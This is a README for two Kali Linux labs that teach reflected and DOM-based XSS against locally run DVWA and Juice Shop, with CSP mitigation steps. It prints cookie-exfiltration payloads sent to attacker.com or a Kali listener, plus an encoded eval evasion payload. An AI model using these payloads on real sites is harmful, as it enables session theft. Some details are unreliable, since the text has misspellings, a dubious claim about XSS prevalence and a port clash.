
# 🔬 Web Application Assessment Experiments: Cross-Site Scripting (XSS) using Kali Linux

This section of the ATTk repository contains **two detailed labs** to teach **Cross-Site Scripting (XSS)** assessment techniques using the **Kali Linux** platform. These exercises primarily use **XSStrike**, **Burp Suite**, and **Python scripting**, and demonstrate defense with **Content Security Policy (CSP)** headers.

---

## 📁 Prerequisites

- Kali Linux (latest version)
- Docker (for DVWA and Juice Shop)
- Burp Suite (Community or Pro)
- Python 3.x
- Firefox or Chromium Browser
- Internet access for pulling Docker images

---

## ⚙️ Experiments 1: Reflected XSS Exploitation with XSStrike and Burp Suite

### Background 
  
Reflected Cross-Site Scripting is a web vulnerability where malicious scripts are injected into a website's dynamic content and then "reflected" into the user's browser. In contrast to the common XSS (stored XSS), with reflected XSS the script is not stroed on the server. Instead the script is delvered through a chealate URL or other input and processed in the browser, typically activated once through clicking. 

### 🎯 Objective

Discover and exploit a **Reflected XSS** vulnerability in DVWA using **XSStrike** and **Burp Suite**, then apply a **CSP** to mitigate the attack.

### 🧪 Environment Setup

1. **Clone and run DVWA in Docker**:
   ```bash
   git clone https://github.com/digininja/DVWA.git
   cd DVWA
   sudo docker-compose up -d
   ```

2. Open DVWA in your browser:
   ```
   http://localhost:8080
   ```

3. Log in:
   - **Username**: `admin`
   - **Password**: `password`
   - Navigate to **DVWA Security** and set **Security Level: Low**

---

### 🔍 Step 1: Discover XSS using XSStrike

1. Run XSStrike:
   ```bash
   cd /usr/share/XSStrike/
   python3 xsstrike.py -u "http://localhost:8080/DVWA/vulnerabilities/xss_r/?name=test"
   ```

2. Review XSStrike's scan output for successful payloads.

---

### 🕵️ Step 2: Manual Validation in Burp Suite

1. Open Burp Suite and configure your browser to use the Burp proxy (`127.0.0.1:8080`).
2. Navigate to the XSS page:
   ```
   http://localhost:8080/DVWA/vulnerabilities/xss_r/
   ```
3. Input:
   ```html
   <script>alert('XSS')</script>
   ```
4. Intercept the request in Burp and send it to **Repeater**.
5. Observe the reflection of your payload in the response.

After submitting test payloads the server response gives a hint of the type of active payload required to heat the vulnerability (HTML tag, Js block). 

---

### 💣 Step 3: Advanced Exploitation

More advanced payloads can be tested:

```html
<script src="http://attacker.com/x.js"></script>
```

```html
<script>new Image().src='http://<YOUR_MALENV_IP>:8000?c='+document.cookie</script>
```

---

### 🛡 Step 4: Mitigate with CSP

1. Edit Apache config (example: `/etc/apache2/sites-available/000-default.conf`) to add:

   ```apache
   Header set Content-Security-Policy "default-src 'self'; script-src 'self';"
   ```

2. Restart Apache:
   ```bash
   sudo systemctl restart apache2
   ```

3. Re-run the exploit: external/injected scripts should now be **blocked**.

---

## ⚙️ Experiments 2: DOM-Based XSS Exploitation and CSP Reporting

### 🎯 Objective

Exploit a **DOM-Based XSS** vulnerability in **OWASP Juice Shop**, capture exfiltrated data using a Python HTTP server, and demonstrate how a strong CSP prevents it.

---

### 🧪 Environment Setup

1. **Start Juice Shop**:
   ```bash
   docker run -d -p 3000:3000 bkimminich/juice-shop
   ```

2. Navigate to:
   ```
   http://localhost:3000
   ```

3. Open Developer Tools → Console

---

### 🔍 Step 1: Discover DOM-Based XSS

1. Visit:
   ```
   http://localhost:3000/#/search?q=<script>alert(1)</script>
   ```

2. If a popup appears, the app is vulnerable to DOM XSS.

---

### 🧑‍💻 Step 2: Exploit with Exfiltration

1. Run Python HTTP server on Kali:
   ```bash
   mkdir attacker_logs
   cd attacker_logs
   python3 -m http.server 8000
   ```

2. Use a crafted payload:
   ```
   http://localhost:3000/#/search?q=<script>new Image().src='http://<KALI_IP>:8000/'+document.cookie</script>
   ```

3. Observe the request hitting your Python server — cookie exfiltration is confirmed.

---

### 👻 Step 3: Evasion Techniques

Try payloads like:
```html
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
```

or encoded/inline variations to bypass simple filters.

---

### 🛡 Step 4: Mitigation with CSP

1. In your reverse proxy or app headers, add:

   ```http
   Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'none';
   ```

2. Reload the page and verify in DevTools that script execution is blocked.

---

### 📉 Step 5: Optional - Monitor CSP Violations

1. Run a server to capture CSP reports:
   ```bash
   python3 -m http.server 9000
   ```

2. Update CSP:
   ```http
   Content-Security-Policy: script-src 'self'; report-uri http://<KALI_IP>:9000/report
   ```

3. Test the same payload and observe JSON reports sent to `/report`.

---

## ✅ Summary

| Task | Lab 1 | Lab 2 |
|------|-------|-------|
| XSStrike | ✅ | ❌ |
| Burp Suite | ✅ | ❌ |
| DOM XSS | ❌ | ✅ |
| Python HTTP Server | ❌ | ✅ |
| CSP Defense | ✅ | ✅ |

---

## 📚 References

- [XSStrike GitHub](https://github.com/s0md3v/XSStrike)
- [OWASP Juice Shop](https://owasp.org/www-project-juice-shop/)
- [Burp Suite](https://portswigger.net/burp)
- [Content Security Policy (MDN)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)

---

> Created for offensive and defensive security education. Use ethically and only in authorized environments.
